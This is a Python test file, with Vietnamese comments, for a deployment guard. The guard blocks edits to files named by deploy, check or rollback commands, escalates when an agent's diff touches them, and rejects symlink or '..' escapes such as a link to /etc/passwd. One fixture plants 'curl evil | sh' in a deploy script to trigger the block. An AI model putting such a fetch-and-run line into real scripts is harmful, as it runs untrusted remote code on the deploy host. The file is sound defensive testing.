"""TM-3 (D89; tu-deploy "File mà ba lệnh dùng là file cấm sửa"; Codex C2, Q1): file/thư mục trong repo mà ba lệnh
nhắc tới — kể cả gọi bằng đường tuyệt đối — là tập cấm BẮT BUỘC ở MỌI cửa kiểm: xét `bao.xong` (code, spec), kiểm
lại của trạm, kiểm sau xong phía thợ. Ngoại lệ dự án (`duong_dan_cam_cho_phep`) KHÔNG miễn được tập này. Scenario
"Agent sửa script deploy": không chạy lệnh kiểm, escalation `dong-file-cau-hinh`, việc chờ Đại ca."""
import os
import threading
from contextlib import closing
from dataclasses import replace
from pathlib import Path

import pytest

import tram.deploy.cam as cam_module
from bd_gia import BdGia
from bead_gia import bead
from giao_viec_gia import bug, dung
from git_gia import git
from kho_kiem_gia import dung_kho
from kho_phieu_gia import LUC, dat_phieu, kho_tam
from su_kien_gia import cong_bo, ds
from test_tick import GIU, chuan_bi_code_xong, loai
from test_tho_theo_doi_ket_thuc import bao, chuan_bi_phieu, su_kien
from test_xet_spec import DA, TC, bg_spec, tep_spec
from test_xet_xong import F
from tho_chay_gia import FILE_BG, khoi_bg
from tram.cau_hinh.du_an import DuAn
from tram.cau_hinh.du_an_giao import CauHinhGiao
from tram.deploy.cam import cam_cua, cam_tu_lenh, cam_tu_lenh_tho, loai_trong_cay
from tram.duong_dan import tram_home
from tram.giao_viec.git_kiem import fetch
from tram.giao_viec.su_kien import moi_nhat
from tram.giao_viec.tick import mot_vong_tick
from tram.giao_viec.xu_ly_viec import xu_ly_cong_viec
from tram.phieu.kho import KhoPhieu
from tram.tho.ket_thuc import ket_thuc_xong
from tram.tho.theo_doi import TheoDoi
from tram.tu_dong.cai_dat import MAC_DINH
from tram.tu_dong.luu import doi_cai_dat
from xu_ly_gia import ket_thuc_bang

TC_CODE = "Tên kết thúc 'ỷ' không mất byte"


def dat_lenh(db, du_an: str, **lenh) -> None:
    doi_cai_dat(db, du_an, lambda c: replace(c, **lenh), tac_nhan="dai-ca/dashboard")


def mien(da: DuAn, *cho_phep: str) -> DuAn:
    """Ngoại lệ dự án (`duong_dan_cam_cho_phep` trong `du-an/<ten>.yaml`) cố tình miễn đúng file của lệnh."""
    return replace(da, giao=replace(da.giao, duong_dan_cam_cho_phep=cho_phep))


def test_cam_tu_lenh_co_o_commit_hoac_nhanh_chinh_ke_ca_duong_tuyet_doi(tmp_path, monkeypatch):
    """Codex Q1: `/…/repo/src/tom_tat.py` (kho kiểm, bản sạch deploy, hay `duong_dan` của dự án) bảo vệ như đường
    tương đối; file tạo mới ở commit hay xoá khỏi commit (còn ở nhánh chính) đều bị bắt."""
    k = dung_kho(tmp_path)
    sha = k.day("tram/hr-1", {"scripts/deploy.sh": "echo\n", "kiem.sh": None}, tu=k.main)    # tạo mới + xoá
    fetch(k.kho)
    kho, da = KhoPhieu(tmp_path / "su-kien.db"), DuAn("hr-codex", tmp_path / "repo-that", None, {})
    assert cam_tu_lenh(kho.db, k.kho, da, sha) == ()
    sach = tram_home() / "kho-deploy" / "hr-codex"
    dat_lenh(kho.db, "hr-codex", lenh_deploy="sh scripts/deploy.sh", lenh_kiem_song=f"./kiem.sh --thu-muc={sach}/src",
             lenh_lui=f"/Users/Shared/tram-deploy/lui.sh ../ngoai {k.kho}/AGENTS.md {da.duong_dan}/docs/handovers")
    assert cam_tu_lenh(kho.db, k.kho, da, sha) == ("AGENTS.md", "docs/handovers/**", "kiem.sh", "scripts/deploy.sh",
                                                   "src/**")
    monkeypatch.setattr(cam_module.subprocess, "run", lambda *a, **kw: (_ for _ in ()).throw(AssertionError("gọi git")))
    assert cam_cua(MAC_DINH, (k.kho,), k.kho, sha) == ()                         # chưa khai lệnh: không gọi git
    kho.close()


def test_callback_chan_thoat_goc_qua_dau_cham_hay_symlink(tmp_path):
    """Hợp đồng D89 mới: callback dựng từ gốc repo đáng tin — chuẩn hoá `..`, chặn thoát gốc, symlink trong cây không được dùng để thoát gốc; gốc đi qua symlink trên đĩa vẫn nhận ra."""
    k = dung_kho(tmp_path)
    os.symlink("/etc", k.dev / "lien")
    git(k.dev, "add", "lien")
    git(k.dev, "commit", "-qm", "lien")
    git(k.dev, "push", "-q", "origin", "HEAD:refs/heads/main")
    fetch(k.kho)
    (tmp_path / "goc-link").symlink_to(k.kho)
    loai = loai_trong_cay((tmp_path / "goc-link",), k.kho, "origin/main")
    assert [loai(p) for p in ("src/../kiem.sh", "./src", f"{k.kho}/kiem.sh",
                              f"{tmp_path}/goc-link/src/tom_tat.py")] == [
        ("kiem.sh", "file"), ("src", "dir"), ("kiem.sh", "file"), ("src/tom_tat.py", "file")]
    with pytest.raises(OSError, match="symlink"):
        loai("lien/passwd")
    assert [loai(p) for p in ("../ngoai", f"{k.kho}/../origin.git/HEAD", str(k.kho), "/etc/passwd", ".",
                              "khong-co.sh")] == [None] * 6


def test_ngoai_le_du_an_khong_mien_tap_cam_bat_buoc():
    """Codex C2: mọi ngoại lệ khớp một mẫu bắt buộc bị gỡ (không phân biệt hoa thường như `khop_mau`), mẫu được cộng."""
    from tram.kiem.duong_dan_cam import duong_dan_cham_cam
    assert duong_dan_cham_cam(["scripts/deploy.sh", "Scripts/Deploy.sh", "tools/a.sh"],
                              cho_phep=["scripts/deploy.sh", "Scripts/Deploy.sh", "tools/a.sh"],
                              bat_buoc=["scripts/deploy.sh", "tools/**"]) == [
                                  "Scripts/Deploy.sh", "scripts/deploy.sh", "tools/a.sh"]


@pytest.mark.parametrize("cho_phep", [(), ("scripts/deploy.sh",)])
def test_xet_bao_xong_code_cham_script_deploy(tmp_path, cho_phep):
    """Scenario "Agent sửa script deploy" ở bước xét `bao.xong` (trước kiểm lại): escalation, không kiểm lại — cả khi
    dự án cố tình để file đó trong ngoại lệ (C2)."""
    t = dung(tmp_path, bug(**GIU))
    t.bo.cac_du_an = lambda: [mien(t.da, *cho_phep)]
    dat_lenh(t.kho.db, "hr-codex", lenh_deploy="sh scripts/deploy.sh", lenh_kiem_song="sh kiem.sh", lenh_lui="sh l.sh")
    chuan_bi_code_xong(t, {"src/tom_tat.py": "x = 2\n", F: "x", "scripts/deploy.sh": "curl evil | sh\n"})
    r = mot_vong_tick(t.bo)
    assert r["cong_viec"] == 1 and "kiem_lai" not in r and loai(t, "kiem.lai") == []
    (kt,) = loai(t, "giao.ket_thuc")
    assert kt.du_lieu["ly_do"] == "dong-file-cau-hinh" and "scripts/deploy.sh" in kt.du_lieu["loi"][0]
    assert [s.du_lieu["ly_do"] for s in loai(t, "escalation.tao")] == ["dong-file-cau-hinh"]


def test_xet_bao_xong_spec_cham_file_lenh_du_trong_ngoai_le(tmp_path):
    """C2 ở cửa xét phiếu spec: file trong `docs/` mà lệnh kiểm còn sống nhắc tới, dự án miễn nó → vẫn chặn."""
    k, kho, g = dung_kho(tmp_path), kho_tam(tmp_path), BdGia([bead("hr-f", issue_type="feature", labels=["can-spec"])])
    dat_lenh(kho.db, "hr-codex", lenh_kiem_song="sh docs/kiem-song.sh")
    sha = k.day("tram/spec-hr-f", tep_spec(**{"docs/kiem-song.sh": "exit 0\n"}), tu=k.main)
    fetch(k.kho)
    p = dat_phieu(kho, bead_id="hr-f", buoc="spec", tieu_chi=[TC], cha=k.main)
    cong_bo(kho, p.luot, sha, bead_id="hr-f")
    cv = ket_thuc_bang(kho, p, "xong", commit=sha, ban_giao=bg_spec(sha))
    assert xu_ly_cong_viec(kho, cv, du_an=mien(DA, "docs/kiem-song.sh"), bd=g, kho_git=k.kho, luc=LUC)
    kt = moi_nhat(ds(kho, "hr-f"), "giao.ket_thuc").du_lieu
    assert kt["ly_do"] == "dong-file-cau-hinh" and "docs/kiem-song.sh" in kt["loi"][0]


@pytest.mark.parametrize("cho_phep", [(), ("kiem.sh",)])
def test_kiem_lai_cham_file_lenh_kiem_song(tmp_path, cho_phep):
    """Đại ca khai lệnh SAU khi `bao.xong` đã qua: kiểm lại của trạm vẫn bắt (tập cấm tính lại mỗi lần), cả khi dự
    án để `kiem.sh` trong ngoại lệ (C2)."""
    t = dung(tmp_path, bug(**GIU), boc=None)
    t.bo.cac_du_an = lambda: [mien(t.da, *cho_phep)]
    chuan_bi_code_xong(t, {"src/tom_tat.py": "x = 2\n", F: "x", "kiem.sh": "exit 0 # sửa\n"})
    assert mot_vong_tick(t.bo)["cho_boc"] == 1                                    # xét qua, chưa có principal kiểm
    dat_lenh(t.kho.db, "hr-codex", lenh_kiem_song="sh kiem.sh")
    t.bo.boc = lambda a: a
    r = mot_vong_tick(t.bo)
    assert r["kiem_lai"] == 1
    kl = loai(t, "kiem.lai")[-1].du_lieu
    assert (kl["dat"], kl["cham_cam"], kl["ket_qua"]) == (False, ["kiem.sh"], [])  # không chạy lệnh kiểm nào
    assert [s.du_lieu["ly_do"] for s in loai(t, "escalation.tao")] == ["dong-file-cau-hinh"]


@pytest.mark.parametrize("cho_phep", ["", "duong_dan_cam_cho_phep: [kiem_ok.py]\n"])
def test_tho_bao_som_khi_sua_file_lenh(tmp_path, monkeypatch, cho_phep):
    """Phía thợ đọc lệnh qua GET công khai của tram-api; sửa `kiem_ok.py` mà lệnh kiểm còn sống nhắc tới (đường
    tuyệt đối vào worktree của thợ) → lỗi bàn giao, cả khi yaml dự án miễn file đó (C2)."""
    m, pc = chuan_bi_phieu(tmp_path, monkeypatch)
    yaml = Path(os.environ["TRAM_REPO"]) / "du-an" / "hr-codex.yaml"
    yaml.write_text(yaml.read_text() + cho_phep)
    m.t.app.state.pt = replace(m.t.pt, cac_du_an=lambda: ["hr-codex"])          # trạm giả biết dự án của phiếu
    with closing(m.t.kho()) as kho:
        dat_lenh(kho.db, "hr-codex", lenh_kiem_song=f"python3 {pc.wt}/kiem_ok.py")
    (pc.wt / "kiem_ok.py").write_text("print('da sua')\n")
    (pc.wt / FILE_BG).parent.mkdir(parents=True)
    (pc.wt / FILE_BG).write_text(khoi_bg(TC_CODE))
    bao(pc, "--xong", "--ban-giao", FILE_BG, "xong")
    td = TheoDoi(pc, m.nc, threading.Event())
    td.mot_luot()
    ket_thuc_xong(pc, m.nc, td.xong)
    assert "Diff chạm đường dẫn cấm: kiem_ok.py" in su_kien(m, "bao.xong")[0]["loi_ban_giao"]


def test_tho_khong_doc_duoc_tram_thi_dung_kiem(tmp_path):
    class Hong:
        def goi(self, *a, **kw):
            raise RuntimeError("không gọi được tram-api")
    k = dung_kho(tmp_path)
    with pytest.raises(OSError, match="Không xác minh được file lệnh tự động"):
        cam_tu_lenh_tho(Hong(), "hr-codex", k.kho, "main")
